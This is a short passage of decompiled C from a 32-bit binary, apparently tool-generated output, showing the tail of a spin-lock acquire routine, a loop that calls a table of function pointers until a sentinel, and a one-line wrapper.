  uVar3 = 0;
  if (*(int *)(param_1 + 0x4c) != iVar1) {
    while( true ) {
      LOCK();
      iVar2 = *(int *)(param_1 + 0x4c);
      if (iVar2 == 0) {
        *(int *)(param_1 + 0x4c) = iVar1;
        iVar2 = 0;
      }
      UNLOCK();
      if (iVar2 == 0) break;
      FUN_08054a70(param_1 + 0x4c,param_1 + 0x50,iVar2,1);
    }
    uVar3 = 1;
  }
  return uVar3;
}



undefined4 FUN_080561d0(void)

{
  code *pcVar1;
  int iVar2;
  undefined4 uStack_c;
  
  if (DAT_08057048 != (code *)0xffffffff) {
    iVar2 = 0;
    pcVar1 = DAT_08057048;
    do {
      (*pcVar1)();
      pcVar1 = *(code **)(&DAT_08057044 + iVar2);
      iVar2 = iVar2 + -4;
    } while (pcVar1 != (code *)0xffffffff);
  }
  return uStack_c;
}



void FUN_080561f7(void)

{
  FUN_080480b0();
  return;
}


